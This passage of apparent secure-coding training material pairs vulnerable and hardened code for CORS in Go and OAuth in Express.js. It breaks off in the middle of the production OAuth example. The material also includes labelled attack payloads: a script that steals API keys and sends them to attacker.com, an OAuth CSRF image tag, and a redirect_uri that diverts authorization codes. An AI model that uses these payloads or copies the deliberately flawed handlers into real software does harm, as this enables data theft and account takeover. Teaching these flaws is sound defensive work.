CORS misconfigurations are extremely dangerous because they can allow malicious websites to make authenticated requests to your API on behalf of your users. Let me show you a vulnerable pattern I see frequently, and then the secure approach.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/json"
	"net/http"
)

type User struct {
	ID       int    `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
	APIKey   string `json:"api_key"`
}

func enableCORS(w http.ResponseWriter, r *http.Request) {
	// VULNERABLE: Reflects any origin - allows all websites to access API
	origin := r.Header.Get("Origin")
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "*")
}

func getUserData(w http.ResponseWriter, r *http.Request) {
	enableCORS(w, r)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Get user from session (authenticated endpoint)
	user := User{
		ID:       1,
		Username: "victim",
		Email:    "victim@example.com",
		APIKey:   "sk_live_abc123secret",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	http.HandleFunc("/api/user", getUserData)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload** (hosted on attacker's website):
```html
<html>
<body>
<script>
fetch('https://vulnerable-api.com/api/user', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Steal API key and send to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      apiKey: data.api_key,
      email: data.email
    })
  });
});
</script>
</body>
</html>
```

**Why This Is Dangerous**:
- Reflecting the Origin header means ANY website can make authenticated requests to your API
- `Access-Control-Allow-Credentials: true` with wildcard origin allows cookies/sessions to be sent
- Attackers can steal sensitive data like API keys, personal information, or perform actions as the victim
- This completely bypasses Same-Origin Policy protections built into browsers

**SECURE VERSION**:

```go
package main

import (
	"encoding/json"
	"net/http"
	"strings"
)

type User struct {
	ID       int    `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
}

// Whitelist of allowed origins
var allowedOrigins = map[string]bool{
	"https://myapp.com":         true,
	"https://www.myapp.com":     true,
	"https://staging.myapp.com": true,
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")

		// Only allow whitelisted origins
		if allowedOrigins[origin] {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			w.Header().Set("Access-Control-Max-Age", "86400")
		}

		// Handle preflight
		if r.Method == "OPTIONS" {
			if !allowedOrigins[origin] {
				w.WriteHeader(http.StatusForbidden)
				return
			}
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func getUserData(w http.ResponseWriter, r *http.Request) {
	// Sensitive data - API key removed from response
	user := User{
		ID:       1,
		Username: "user",
		Email:    "user@example.com",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/user", getUserData)

	handler := corsMiddleware(mux)
	http.ListenAndServe(":8080", handler)
}
```

**Key Security Controls**:
- **Origin Whitelist**: Only explicitly allowed origins can make cross-origin requests with credentials
- **Explicit Header List**: Only specific headers are allowed, not `*` which would allow any header
- **No Sensitive Data in CORS Responses**: API keys should never be returned in responses accessible via CORS
- **Proper Preflight Handling**: OPTIONS requests are validated before allowing the actual request

Dynamic origin validation requires careful implementation to avoid regex bypass vulnerabilities. Here's a production-ready pattern with proper subdomain handling, monitoring, and defense in depth.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type CORSConfig struct {
	AllowedDomains    []string
	AllowedMethods    []string
	AllowedHeaders    []string
	ExposedHeaders    []string
	MaxAge            int
	AllowCredentials  bool
	EnableLogging     bool
}

type CORSMiddleware struct {
	config     CORSConfig
	logger     *slog.Logger
	violations *ViolationTracker
}

type ViolationTracker struct {
	mu        sync.RWMutex
	violations map[string]int
	threshold  int
}

func NewViolationTracker(threshold int) *ViolationTracker {
	return &ViolationTracker{
		violations: make(map[string]int),
		threshold:  threshold,
	}
}

func (vt *ViolationTracker) RecordViolation(origin string) bool {
	vt.mu.Lock()
	defer vt.mu.Unlock()

	vt.violations[origin]++
	return vt.violations[origin] >= vt.threshold
}

func (vt *ViolationTracker) GetViolationCount(origin string) int {
	vt.mu.RLock()
	defer vt.mu.RUnlock()
	return vt.violations[origin]
}

func NewCORSMiddleware(config CORSConfig) *CORSMiddleware {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))

	return &CORSMiddleware{
		config:     config,
		logger:     logger,
		violations: NewViolationTracker(10),
	}
}

// isOriginAllowed performs secure origin validation
func (cm *CORSMiddleware) isOriginAllowed(origin string) bool {
	if origin == "" {
		return false
	}

	// Parse origin to validate it's a proper URL
	parsedOrigin, err := url.Parse(origin)
	if err != nil {
		cm.logger.Warn("invalid origin format",
			slog.String("origin", origin),
			slog.String("error", err.Error()))
		return false
	}

	// Only allow HTTPS in production
	if os.Getenv("ENV") == "production" && parsedOrigin.Scheme != "https" {
		cm.logger.Warn("rejected non-HTTPS origin in production",
			slog.String("origin", origin))
		return false
	}

	host := strings.ToLower(parsedOrigin.Host)

	for _, allowedDomain := range cm.config.AllowedDomains {
		// Exact match
		if host == allowedDomain {
			return true
		}

		// Subdomain match (secure implementation)
		if strings.HasPrefix(allowedDomain, "*.") {
			baseDomain := allowedDomain[2:] // Remove "*."

			// Host must end with .baseDomain (not just baseDomain)
			// This prevents attacker.commyapp.com from matching *.myapp.com
			if strings.HasSuffix(host, "."+baseDomain) {
				// Ensure no path traversal or tricks in subdomain
				subdomain := strings.TrimSuffix(host, "."+baseDomain)
				if isValidSubdomain(subdomain) {
					return true
				}
			}
		}
	}

	return false
}

// isValidSubdomain prevents subdomain-based attacks
func isValidSubdomain(subdomain string) bool {
	// No empty subdomains
	if subdomain == "" {
		return false
	}

	// No path-like content
	if strings.Contains(subdomain, "/") {
		return false
	}

	// Only allow alphanumeric, hyphens, and dots for multi-level subdomains
	for _, c := range subdomain {
		if !((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}

	// No leading/trailing hyphens or dots
	if strings.HasPrefix(subdomain, "-") || strings.HasSuffix(subdomain, "-") ||
		strings.HasPrefix(subdomain, ".") || strings.HasSuffix(subdomain, ".") {
		return false
	}

	return true
}

func (cm *CORSMiddleware) Handler(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		requestID := r.Header.Get("X-Request-ID")
		if requestID == "" {
			requestID = fmt.Sprintf("%d", time.Now().UnixNano())
		}

		// Add request ID to context
		ctx := context.WithValue(r.Context(), "requestID", requestID)
		r = r.WithContext(ctx)

		// Always set Vary header to prevent cache poisoning
		w.Header().Set("Vary", "Origin")

		if cm.isOriginAllowed(origin) {
			w.Header().Set("Access-Control-Allow-Origin", origin)

			if cm.config.AllowCredentials {
				w.Header().Set("Access-Control-Allow-Credentials", "true")
			}

			if len(cm.config.ExposedHeaders) > 0 {
				w.Header().Set("Access-Control-Expose-Headers",
					strings.Join(cm.config.ExposedHeaders, ", "))
			}

			// Log successful CORS request
			if cm.config.EnableLogging {
				cm.logger.Info("cors_request_allowed",
					slog.String("request_id", requestID),
					slog.String("origin", origin),
					slog.String("method", r.Method),
					slog.String("path", r.URL.Path),
					slog.String("remote_addr", r.RemoteAddr))
			}
		} else if origin != "" {
			// Log CORS violation
			shouldAlert := cm.violations.RecordViolation(origin)

			cm.logger.Warn("cors_violation_detected",
				slog.String("request_id", requestID),
				slog.String("origin", origin),
				slog.String("method", r.Method),
				slog.String("path", r.URL.Path),
				slog.String("remote_addr", r.RemoteAddr),
				slog.String("user_agent", r.UserAgent()),
				slog.Int("violation_count", cm.violations.GetViolationCount(origin)),
				slog.Bool("alert_triggered", shouldAlert))

			if shouldAlert {
				// Trigger security alert (integrate with your alerting system)
				cm.triggerSecurityAlert(origin, r)
			}
		}

		// Handle preflight
		if r.Method == http.MethodOptions {
			if !cm.isOriginAllowed(origin) {
				w.WriteHeader(http.StatusForbidden)
				return
			}

			w.Header().Set("Access-Control-Allow-Methods",
				strings.Join(cm.config.AllowedMethods, ", "))
			w.Header().Set("Access-Control-Allow-Headers",
				strings.Join(cm.config.AllowedHeaders, ", "))
			w.Header().Set("Access-Control-Max-Age",
				fmt.Sprintf("%d", cm.config.MaxAge))

			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func (cm *CORSMiddleware) triggerSecurityAlert(origin string, r *http.Request) {
	// Integration point for security alerting (PagerDuty, Slack, SIEM)
	cm.logger.Error("security_alert_cors_abuse",
		slog.String("alert_type", "cors_abuse_threshold_exceeded"),
		slog.String("origin", origin),
		slog.String("remote_addr", r.RemoteAddr),
		slog.String("severity", "high"))
}

func getUserProfile(w http.ResponseWriter, r *http.Request) {
	// Only return non-sensitive data
	response := map[string]interface{}{
		"id":       1,
		"username": "user",
		"email":    "user@example.com",
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	json.NewEncoder(w).Encode(response)
}

func main() {
	config := CORSConfig{
		AllowedDomains: []string{
			"myapp.com",
			"www.myapp.com",
			"*.myapp.com", // Secure subdomain matching
		},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE"},
		AllowedHeaders:   []string{"Content-Type", "Authorization", "X-Request-ID"},
		ExposedHeaders:   []string{"X-Request-ID"},
		MaxAge:           86400,
		AllowCredentials: true,
		EnableLogging:    true,
	}

	// Add development origin only in non-production
	if os.Getenv("ENV") != "production" {
		config.AllowedDomains = append(config.AllowedDomains, "localhost:3000")
	}

	cors := NewCORSMiddleware(config)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/user", getUserProfile)

	handler := cors.Handler(mux)

	server := &http.Server{
		Addr:         ":8080",
		Handler:      handler,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	fmt.Println("Server starting on :8080")
	server.ListenAndServe()
}
```

**Defense in Depth Layers**:

1. **Secure Subdomain Validation**:
```go
// Prevents attacker.commyapp.com from matching *.myapp.com
if strings.HasSuffix(host, "."+baseDomain) {
    subdomain := strings.TrimSuffix(host, "."+baseDomain)
    if isValidSubdomain(subdomain) {
        return true
    }
}
```

2. **Cache Poisoning Prevention**:
```go
// Always set Vary header to prevent CDN cache poisoning
w.Header().Set("Vary", "Origin")
```

3. **Violation Monitoring and Alerting**:
```go
// Track and alert on repeated CORS violations
shouldAlert := cm.violations.RecordViolation(origin)
if shouldAlert {
    cm.triggerSecurityAlert(origin, r)
}
```

**Additional Protections**:
- **Protocol Enforcement**: Only HTTPS origins allowed in production to prevent downgrade attacks
- **Structured Logging**: JSON logs with request IDs for security incident investigation and SIEM integration
- **Environment Separation**: Development origins only allowed in non-production environments
- **Request Timeouts**: Server timeouts configured to prevent slowloris and connection exhaustion attacks
- **Security Headers**: Additional headers like `X-Content-Type-Options: nosniff` to prevent MIME-type confusion attacks

OAuth implementations are frequently misconfigured, leading to account takeover and token theft. The 2022 GitHub/Heroku incident demonstrated how weak redirect URI validation and missing state parameter verification can be catastrophic.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = process.env.OAUTH_CLIENT_ID;
const CLIENT_SECRET = process.env.OAUTH_CLIENT_SECRET;
const REDIRECT_URI = 'http://myapp.com/callback';

// VULNERABLE: No state parameter generated
app.get('/login', (req, res) => {
  const authUrl = `https://oauth.provider.com/authorize?` +
    `client_id=${CLIENT_ID}&` +
    `redirect_uri=${REDIRECT_URI}&` +
    `response_type=code&` +
    `scope=user:email`;
  res.redirect(authUrl);
});

// VULNERABLE: Multiple issues in callback handling
app.get('/callback', async (req, res) => {
  const { code, redirect_uri } = req.query;

  // VULNERABLE: Accepts redirect_uri from query params
  const callbackUrl = redirect_uri || REDIRECT_URI;

  // VULNERABLE: No state validation
  // VULNERABLE: No code validation
  const tokenResponse = await axios.post(
    'https://oauth.provider.com/token',
    {
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      code: code,
      redirect_uri: callbackUrl,
      grant_type: 'authorization_code'
    }
  );

  // VULNERABLE: Trusting user info without verification
  const userInfo = await axios.get(
    'https://oauth.provider.com/user',
    { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }}
  );

  // VULNERABLE: Direct session creation without email verification
  req.session.user = userInfo.data;
  res.redirect('/dashboard');
});

app.listen(3000);
```

**Attack Payload - CSRF via Missing State Parameter**:
```html
<!-- Attacker hosts this on their site -->
<img src="https://myapp.com/callback?code=ATTACKER_AUTH_CODE" style="display:none">
<!-- When victim visits, their session links to attacker's OAuth account -->
```

**Attack Payload - Open Redirect Token Theft**:
```text
https://oauth.provider.com/authorize?
  client_id=VICTIM_CLIENT_ID&
  redirect_uri=https://attacker.com/steal&
  response_type=code&
  scope=user:email

# If redirect_uri validation is weak, authorization code goes to attacker
```

**Why This Is Dangerous**:
- **Missing state parameter**: Enables CSRF attacks where attacker can link victim's session to attacker's OAuth account
- **Accepting redirect_uri from query**: Allows attackers to redirect authorization codes to their server
- **No code validation**: Authorization codes can be replayed or stolen
- **Implicit trust in provider data**: Email from OAuth provider may not be verified

**SECURE VERSION**:

```javascript
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const session = require('express-session');

const app = express();

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: true, httpOnly: true, sameSite: 'lax' }
}));

const CLIENT_ID = process.env.OAUTH_CLIENT_ID;
const CLIENT_SECRET = process.env.OAUTH_CLIENT_SECRET;
// SECURE: Hardcoded, registered redirect URI
const REDIRECT_URI = 'https://myapp.com/callback';

// SECURE: Generate and store cryptographic state
app.get('/login', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  const nonce = crypto.randomBytes(32).toString('hex');

  // Store state in session for validation
  req.session.oauthState = state;
  req.session.oauthNonce = nonce;
  req.session.oauthTimestamp = Date.now();

  const authUrl = `https://oauth.provider.com/authorize?` +
    `client_id=${encodeURIComponent(CLIENT_ID)}&` +
    `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
    `response_type=code&` +
    `scope=user:email&` +
    `state=${encodeURIComponent(state)}&` +
    `nonce=${encodeURIComponent(nonce)}`;

  res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
  const { code, state, error } = req.query;

  // SECURE: Handle OAuth errors
  if (error) {
    console.error(`OAuth error: ${error}`);
    return res.status(400).redirect('/login?error=oauth_failed');
  }

  // SECURE: Validate state parameter against session
  if (!state || !req.session.oauthState || 
      !crypto.timingSafeEqual(
        Buffer.from(state), 
        Buffer.from(req.session.oauthState)
      )) {
    console.error('Invalid OAuth state parameter');
    return res.status(403).redirect('/login?error=invalid_state');
  }

  // SECURE: Check state expiration (5 minute window)
  if (Date.now() - req.session.oauthTimestamp > 300000) {
    console.error('OAuth state expired');
    return res.status(403).redirect('/login?error=state_expired');
  }

  // Clear OAuth state immediately after validation
  delete req.session.oauthState;
  delete req.session.oauthTimestamp;

  try {
    // SECURE: Use hardcoded redirect_uri, never from request
    const tokenResponse = await axios.post(
      'https://oauth.provider.com/token',
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        code: code,
        redirect_uri: REDIRECT_URI,
        grant_type: 'authorization_code'
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }}
    );

    // SECURE: Validate token response structure
    if (!tokenResponse.data.access_token) {
      throw new Error('No access token in response');
    }

    const userInfo = await axios.get(
      'https://oauth.provider.com/user',
      { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }}
    );

    // SECURE: Verify email is confirmed by provider
    if (!userInfo.data.email_verified) {
      return res.status(403).redirect('/login?error=email_not_verified');
    }

    // Create session with validated user data
    req.session.regenerate((err) => {
      if (err) throw err;
      req.session.user = {
        id: userInfo.data.id,
        email: userInfo.data.email,
        provider: 'oauth_provider'
      };
      res.redirect('/dashboard');
    });

  } catch (error) {
    console.error('OAuth token exchange failed:', error.message);
    res.status(500).redirect('/login?error=server_error');
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **Cryptographic state parameter**: 32-byte random value prevents CSRF attacks using timing-safe comparison
- **Hardcoded redirect_uri**: Never accept redirect URI from request parameters
- **State expiration**: 5-minute window prevents replay attacks with stolen states
- **Email verification check**: Ensures OAuth provider has verified the user's email
- **Session regeneration**: Prevents session fixation after authentication

Multi-provider OAuth with PKCE requires careful handling to prevent token confusion (CVE-2024-5217 in Okta), IdP mixup attacks, and code injection. Here's a production-ready implementation:

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const session = require('express-session');
const { createClient } = require('redis');
const RedisStore = require('connect-redis').default;
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();

// Security headers
app.use(helmet());

// Redis for distributed session storage
const redisClient = createClient({ url: process.env.REDIS_URL });
